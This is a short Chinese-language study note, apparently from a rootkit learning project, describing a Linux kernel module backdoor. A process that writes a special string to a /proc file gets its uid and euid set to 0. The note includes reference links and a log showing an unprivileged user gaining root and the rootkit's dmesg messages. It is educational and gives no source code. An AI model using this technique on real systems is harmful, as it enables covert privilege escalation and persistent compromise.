## 提供root后门
本资料的思路是在/proc之中提供一个文件，如果某个进程向该文件写入特定内容，则让模块赋进程的uid和euid为0。

那么，如何在内核模块中创建/proc下面的文件?

采用`proc_create`与`proc_remove`？查阅了一下这两个函数至少在5.4.81版本中他们是存在的。

查阅一下这两个函数的基本信息，在原项目中已经详细给出，这里稍作补充，第二个例子尤其好：

https://stackoverflow.com/questions/8516021/proc-create-example-for-kernel-module

https://devarea.com/linux-kernel-development-creating-a-proc-file-and-interfacing-with-user-space/#.Y0K-JHZBxD8

这则post解释了proc_create的参数选取：
https://stackoverflow.com/questions/28664971/why-is-does-proc-create-mode-argument-0-correspond-to-0444

mode选取采用了UGO策略，望周知。

我们尝试按照文章内的思路实现一个拥有后门的玩具。

## 实验记录
```
root@ubuntu:/home/link/Desktop/libreCrops# insmod backdoor.ko
root@ubuntu:/home/link/Desktop/libreCrops# useradd annon
root@ubuntu:/home/link/Desktop/libreCrops# su annon
$ ./rootme.sh
uid=1001(annon) gid=1001(annon) groups=1001(annon)
/proc/kcore: regular file, no read permission
uid=0(root) gid=0(root) groups=0(root),1001(annon)
/proc/kcore: ELF 64-bit LSB core file, x86-64, version 1 (SYSV), SVR4-style, from 'BOOT_IMAGE=/boot/vmlinuz-5.4.0-81-generic root=UUID=1628dcf5-3fb1-49e0-a3f6-e03'
$ exit
root@ubuntu:/home/link/Desktop/libreCrops# userdel annon
root@ubuntu:/home/link/Desktop/libreCrops# rmmod backdoor.ko
root@ubuntu:/home/link/Desktop/libreCrops# dmesg
[ 1283.115726] Rootkit is entering.
[ 1297.012164] Alien, get out of here: a_wrong_try.
[ 1297.014952] Comrade, I will help you.
[ 1297.014952] See you!
[ 1321.659761] Rootkit is leaving.
root@ubuntu:/home/link/Desktop/libreCrops# 
```
